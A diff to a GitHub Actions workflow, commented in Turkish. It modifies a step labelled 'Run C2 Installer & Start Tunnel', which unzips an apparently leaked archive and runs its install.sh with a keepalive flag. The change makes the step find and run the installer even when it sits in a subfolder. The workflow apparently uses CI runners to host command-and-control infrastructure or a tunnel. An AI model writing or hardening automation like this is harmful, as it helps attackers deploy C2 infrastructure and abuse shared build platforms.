@@ -20,12 +20,25 @@ jobs:
 
       - name: Run C2 Installer & Start Tunnel
         run: |
-          # 1. Zip dosyasını soru sormadan (-q) ve üzerine yazarak (-o) çıkart
+          # 1. Zip dosyasını sessizce ve üzerine yazarak çıkart
           unzip -q -o ./agarnetshitleakbyVessy1337.zip
           
-          # 2. Kurulum betiğine çalıştırma izni ver
-          chmod +x install.sh
+          # 2. Arşivden çıkan dosyaları listele (Loglarda klasör adını net görebilmek için)
+          ls -la
           
-          # 3. Scripti çalıştır (Eğer keepalive veya tünel terminali kilitliyorsa arkaya atabilirsiniz, 
-          # ancak doğrudan çalışmasını istiyorsanız aşağıdaki gibi bırakabilirsiniz)
-          ./install.sh --keepalive
+          # 3. install.sh dosyası doğrudan ana dizindeyse çalıştır, değilse alt klasöre gir
+          if [ -f "install.sh" ]; then
+            chmod +x install.sh
+            ./install.sh --keepalive
+          else
+            # Eğer zip dosyası bir klasör oluşturduysa, o klasörün içindeki install.sh'i bul ve çalıştır
+            TARGET_DIR=$(find . -maxdepth 2 -name "install.sh" -exec dirname {} \;)
+            if [ -n "$TARGET_DIR" ]; then
+              cd "$TARGET_DIR"
+              chmod +x install.sh
+              ./install.sh --keepalive
+            else
+              echo "Hata: install.sh dosyası hiçbir dizinde bulunamadı!"
+              exit 1
+            fi
+          fi
